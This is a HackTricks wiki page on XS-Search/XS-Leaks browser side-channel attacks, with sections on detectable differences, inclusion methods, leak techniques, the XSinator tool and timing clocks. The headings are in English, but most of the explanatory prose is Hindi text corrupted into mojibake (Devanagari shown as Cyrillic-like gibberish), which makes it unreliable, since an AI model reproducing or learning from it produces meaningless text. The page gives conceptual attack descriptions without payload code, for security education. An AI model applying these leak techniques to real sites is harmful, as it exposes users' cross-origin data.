# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ** рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реИрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

XS-Search рдПрдХ рд╡рд┐рдзрд┐ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЬрд╛рдирдХрд╛рд░реА** рдХреЛ **рд╕рд╛рдЗрдб рдЪреИрдирд▓ рдХрдордЬреЛрд░рд┐рдпреЛрдВ** рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ **рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдореБрдЦреНрдп рдШрдЯрдХ рд╣реИрдВ:

* **рдХрдордЬреЛрд░ рд╡реЗрдм**: рд▓рдХреНрд╖рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЬрд┐рд╕рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛рдиреА рд╣реИред
* **рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рд╡реЗрдм**: рд╡рд╣ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ, рдЬрд┐рд╕реЗ рдкреАрдбрд╝рд┐рдд рд╡рд┐рдЬрд┐рдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рд╣реЛрд╕реНрдЯ рдХрд░рддреА рд╣реИред
* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐**: рд╡рд╣ рддрдХрдиреАрдХ рдЬреЛ рдХрдордЬреЛрд░ рд╡реЗрдм рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╡реЗрдм рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ (рдЬреИрд╕реЗ, window.open, iframe, fetch, href рдХреЗ рд╕рд╛рде HTML рдЯреИрдЧ, рдЖрджрд┐)ред
* **рд▓реАрдХ рддрдХрдиреАрдХ**: рддрдХрдиреАрдХреЗрдВ рдЬреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХрддреНрд░ рдХреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХрдордЬреЛрд░ рд╡реЗрдм рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдПрдБ рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВред
* **рд░рд╛рдЬреНрдп**: рдХрдордЬреЛрд░ рд╡реЗрдм рдХреА рджреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐рдпрд╛рдБ, рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдкрд╣рдЪрд╛рдирдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рднрд┐рдиреНрдирддрд╛рдПрдБ**: рдЕрд╡рд▓реЛрдХрдиреАрдп рднрд┐рдиреНрдирддрд╛рдПрдБ рдЬрд┐рди рдкрд░ рд╣рдорд▓рд╛рд╡рд░ рдХрдордЬреЛрд░ рд╡реЗрдм рдХреА рд╕реНрдерд┐рддрд┐ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

### Detectable Differences

рдХрдордЬреЛрд░ рд╡реЗрдм рдХреА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЛ рднрд┐рдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдкрд╣рд▓реБрдУрдВ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* **рд╕реНрдерд┐рддрд┐ рдХреЛрдб**: **рд╡рд┐рднрд┐рдиреНрди HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реНрдерд┐рддрд┐ рдХреЛрдб** рдХреЗ рдмреАрдЪ рднреЗрдж рдХрд░рдирд╛, рдЬреИрд╕реЗ рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐рдпрд╛рдБ, рдХреНрд▓рд╛рдЗрдВрдЯ рддреНрд░реБрдЯрд┐рдпрд╛рдБ, рдпрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рддреНрд░реБрдЯрд┐рдпрд╛рдБред
* **API рдЙрдкрдпреЛрдЧ**: рдкреГрд╖реНрдареЛрдВ рдХреЗ рдмреАрдЪ **рд╡реЗрдм APIs рдХреЗ рдЙрдкрдпреЛрдЧ** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛, рдпрд╣ рдкреНрд░рдХрдЯ рдХрд░рдирд╛ рдХрд┐ рдХреНрдпрд╛ рдПрдХ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреГрд╖реНрда рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡реЗрдм API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕**: рд╡рд┐рднрд┐рдиреНрди рдкреГрд╖реНрдареЛрдВ рдкрд░ рдиреЗрд╡рд┐рдЧреЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛, рди рдХреЗрд╡рд▓ HTTP рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕ рдмрд▓реНрдХрд┐ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ HTML рджреНрд╡рд╛рд░рд╛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЧрдПред
* **рдкреГрд╖реНрда рд╕рд╛рдордЧреНрд░реА**: **HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╢рд░реАрд░ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдУрдВ** рдпрд╛ рдкреГрд╖реНрда рдЙрдк-рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдореЗрдВ рдЕрд╡рд▓реЛрдХрди рдХрд░рдирд╛, рдЬреИрд╕реЗ **рдПрдВрдмреЗрдбреЗрдб рдлреНрд░реЗрдо рдХреА рд╕рдВрдЦреНрдпрд╛** рдпрд╛ рдЫрд╡рд┐рдпреЛрдВ рдореЗрдВ рдЖрдХрд╛рд░ рднрд┐рдиреНрдирддрд╛рдПрдБред
* **HTTP рд╣реЗрдбрд░**: **рд╡рд┐рд╢рд┐рд╖реНрдЯ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░** рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдпрд╛ рд╕рдВрднрд╡рддрдГ рдЙрд╕рдХреЗ рдорд╛рди рдХреЛ рдиреЛрдЯ рдХрд░рдирд╛, рдЬрд┐рд╕рдореЗрдВ X-Frame-Options, Content-Disposition, рдФрд░ Cross-Origin-Resource-Policy рдЬреИрд╕реЗ рд╣реЗрдбрд░ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* **рд╕рдордп**: рджреЛрдиреЛрдВ рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рд▓рдЧрд╛рддрд╛рд░ рд╕рдордп рднрд┐рдиреНрдирддрд╛рдУрдВ рдХрд╛ рдзреНрдпрд╛рди рд░рдЦрдирд╛ред

### Inclusion Methods

* **HTML рддрддреНрд╡**: HTML рд╡рд┐рднрд┐рдиреНрди рддрддреНрд╡реЛрдВ рдХреА рдкреЗрд╢рдХрд╢ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рд╕рдорд╛рд╡реЗрд╢** рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯ, рдЫрд╡рд┐рдпрд╛рдБ, рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдЬреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдПрдХ рдЧреИрд░-HTML рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд HTML рддрддреНрд╡реЛрдВ рдХрд╛ рд╕рдВрдХрд▓рди [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) рдкрд░ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **рдлреНрд░реЗрдо**: рддрддреНрд╡ рдЬреИрд╕реЗ **iframe**, **object**, рдФрд░ **embed** HTML рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕реАрдзреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкреГрд╖реНрда рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдкреГрд╖реНрда **рдлреНрд░реЗрдорд┐рдВрдЧ рд╕реБрд░рдХреНрд╖рд╛** рдХреА рдХрдореА рд╣реИ, рддреЛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлреНрд░реЗрдо рдХрд┐рдП рдЧрдП рд╕рдВрд╕рд╛рдзрди рдХреА рд╡рд┐рдВрдбреЛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ contentWindow рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рдкреЙрдк-рдЕрдк**: **`window.open`** рд╡рд┐рдзрд┐ рдПрдХ рдирдП рдЯреИрдм рдпрд╛ рд╡рд┐рдВрдбреЛ рдореЗрдВ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдЦреЛрд▓рддреА рд╣реИ, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╡рд┐рдзрд┐рдпреЛрдВ рдФрд░ рдЧреБрдгреЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╡рд┐рдВрдбреЛ рд╣реИрдВрдбрд▓** рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ рдЬреЛ SOP рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреА рд╣реИред рдкреЙрдк-рдЕрдк, рдЬреЛ рдЕрдХреНрд╕рд░ рд╕рд┐рдВрдЧрд▓ рд╕рд╛рдЗрди-рдСрди рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрддреЗ рд╣реИрдВ, рд▓рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрди рдХреА рдлреНрд░реЗрдорд┐рдВрдЧ рдФрд░ рдХреБрдХреА рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЖрдзреБрдирд┐рдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдкреЙрдк-рдЕрдк рдирд┐рд░реНрдорд╛рдг рдХреЛ рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рд╕реАрдорд┐рдд рдХрд░рддреЗ рд╣реИрдВред
* **рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдиреБрд░реЛрдз**: рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ **XMLHttpRequests** рдпрд╛ **Fetch API** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдпреЗ рд╡рд┐рдзрд┐рдпрд╛рдБ рдЕрдиреБрд░реЛрдз рдкрд░ рд╕рдЯреАрдХ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ, рдЬреИрд╕реЗ HTTP рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рдЪреБрдирдирд╛ред

### Leak Techniques

* **рдЗрд╡реЗрдВрдЯ рд╣реИрдВрдбрд▓рд░**: XS-Leaks рдореЗрдВ рдПрдХ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд▓реАрдХ рддрдХрдиреАрдХ, рдЬрд╣рд╛рдВ рдЗрд╡реЗрдВрдЯ рд╣реИрдВрдбрд▓рд░ рдЬреИрд╕реЗ **onload** рдФрд░ **onerror** рд╕рдВрд╕рд╛рдзрди рд▓реЛрдбрд┐рдВрдЧ рдХреА рд╕рдлрд▓рддрд╛ рдпрд╛ рд╡рд┐рдлрд▓рддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред
* **рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢**: рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдкрд╡рд╛рдж рдпрд╛ рд╡рд┐рд╢реЗрд╖ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рд▓реАрдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рддреЛ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рд╕реЗ рд╕реАрдзреЗ рдпрд╛ рдЗрд╕рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдФрд░ рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдХреЗ рдмреАрдЪ рднреЗрдж рдХрд░рдХреЗред
* **рд╡реИрд╢реНрд╡рд┐рдХ рд╕реАрдорд╛рдПрдБ**: рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рднреМрддрд┐рдХ рд╕реАрдорд╛рдПрдБ, рдЬреИрд╕реЗ рдореЗрдореЛрд░реА рдХреНрд╖рдорддрд╛ рдпрд╛ рдЕрдиреНрдп рд▓рд╛рдЧреВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реАрдорд╛рдПрдБ, рдпрд╣ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреА рд╣реИрдВ рдХрд┐ рдХрдм рдПрдХ рд╕реАрдорд╛ рддрдХ рдкрд╣реБрдБрдЪ рдЧрдИ рд╣реИ, рдЬреЛ рдПрдХ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреА рд╣реИред
* **рд╡реИрд╢реНрд╡рд┐рдХ рд╕реНрдерд┐рддрд┐**: рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА **рд╡реИрд╢реНрд╡рд┐рдХ рд╕реНрдерд┐рддрд┐рдпреЛрдВ** (рдЬреИрд╕реЗ, рдЗрддрд┐рд╣рд╛рд╕ рдЗрдВрдЯрд░рдлреЗрд╕) рдХреЗ рд╕рд╛рде рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ **рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреГрд╖реНрдареЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реБрд░рд╛рдЧ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреА рд╣реИред
* **рдкрд░рдлреЙрд░реНрдореЗрдВрд╕ API**: рдпрд╣ API **рд╡рд░реНрддрдорд╛рди рдкреГрд╖реНрда рдХреЗ рдкреНрд░рджрд░реНрд╢рди рд╡рд┐рд╡рд░рдг** рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдФрд░ рд▓реЛрдб рдХрд┐рдП рдЧрдП рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рд╕рдордп рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рдЕрдиреБрд░реЛрдзрд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред
* **рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ**: рдХреБрдЫ HTML рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп** рд╣реЛрддреА рд╣реИрдВ рдФрд░ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `window.frame.length` рдкреНрд░реЙрдкрд░реНрдЯреА рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХ рд╡реЗрдмрдкреГрд╖реНрда рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдлреНрд░реЗрдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдЧрд┐рдирдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

## XSinator Tool & Paper

XSinator рдПрдХ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ **рдХрдИ рдЬреНрдЮрд╛рдд XS-Leaks** рдХреЗ рдЦрд┐рд▓рд╛рдл рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдХреА **рдЬрд╛рдВрдЪ** рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЗрд╕рдХреЗ рдкреЗрдкрд░ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

рдЖрдк **рдЙрдкрдХрд░рдг рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**рдЕрд▓рдЧ рдХрд┐рдП рдЧрдП XS-Leaks**: рд╣рдореЗрдВ рдЙрди XS-Leaks рдХреЛ рдЕрд▓рдЧ рдХрд░рдирд╛ рдкрдбрд╝рд╛ рдЬреЛ **рд╕реЗрд╡рд╛ рд╢реНрд░рдорд┐рдХреЛрдВ** рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ XSinator рдореЗрдВ рдЕрдиреНрдп рд▓реАрдХ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░реЗрдВрдЧреЗред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╣рдордиреЗ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рдмрдЧреНрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ XS-Leaks рдХреЛ рднреА рдЕрд▓рдЧ рдХрд░рдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓рд┐рдпрд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, CrossOrigin Resource Sharing (CORS) рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди, postMessage рд▓реАрдХ рдпрд╛ Cross-Site Scriptingред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рд╣рдордиреЗ рд╕рдордп рдЖрдзрд╛рд░рд┐рдд XS-Leaks рдХреЛ рднреА рдЕрд▓рдЧ рдХрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдЕрдХреНрд╕рд░ рдзреАрдореЗ, рд╢реЛрд░ рд╡рд╛рд▓реЗ рдФрд░ рдЕрд╕рдВрдЧрдд рд╣реЛрддреЗ рд╣реИрдВред
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВ** рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реИрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Timing Based techniques**

рдХреБрдЫ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЗрдВ рд╕рдордп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реА рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗрдм рдкреГрд╖реНрдареЛрдВ рдХреА рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдПрдБ рдкрд╣рдЪрд╛рди рд╕рдХреЗрдВред рдПрдХ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рд╕рдордп рдорд╛рдкрдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВред

**рдШрдбрд╝рд┐рдпрд╛рдБ**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рдЙрдЪреНрдЪ-рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рд╕рдордп рдорд╛рдк рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред\
рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рдкрд╛рд╕ рдирд┐рд╣рд┐рдд рдШрдбрд╝рд┐рдпрд╛рдБ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ APIs рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ APIs рд╣реИрдВ: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS рдПрдирд┐рдореЗрд╢рди, рдФрд░ рдЕрдиреНрдпред\
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Event Handler Techniques

### Onload/Onerror

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Status Code
* **More info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
